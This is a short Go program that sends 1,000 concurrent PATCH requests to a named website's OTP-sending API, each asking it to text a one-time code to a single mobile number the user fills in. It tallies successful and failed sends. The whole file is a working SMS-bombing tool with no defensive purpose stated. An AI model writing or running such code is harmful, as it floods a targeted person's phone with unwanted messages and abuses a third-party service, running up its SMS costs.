package main

import (
	"bytes"
	"fmt"
	"net/http"
	"net/url"
	"sync"
)

const (
	urlStr = "https://ekbaarphirsemodisarkar.com/api/v1/user/send_otp_mobile?language=en"
	// urlStr = "https://github.com/animeshchaudhri"
)

var (
	successCount int
	failureCount int
	mutex        sync.Mutex // Mutex to protect shared variables
	wg           sync.WaitGroup
)

func sendRequest(mobile string) {
	defer wg.Done()

	data := url.Values{}
	data.Set("mobile", mobile)

	req, err := http.NewRequest("PATCH", urlStr, bytes.NewBufferString(data.Encode()))
	if err != nil {
		fmt.Println("Error creating request:", err)
		mutex.Lock()
		failureCount++
		mutex.Unlock()
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		mutex.Lock()
		failureCount++
		mutex.Unlock()
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		mutex.Lock()
		successCount++
		mutex.Unlock()
		fmt.Println("Response: Success")
	} else {
		mutex.Lock()
		failureCount++
		mutex.Unlock()
		fmt.Println("Response: Failure")
	}
}

func main() {
	mobile := ""  //YOUR NUMBER HERE

	numRequests := 1000
	wg.Add(numRequests)

	for i := 0; i < numRequests; i++ {
		go sendRequest(mobile)
	}

	wg.Wait()

	fmt.Println("Success:", successCount)
	fmt.Println("Failure:", failureCount)
}
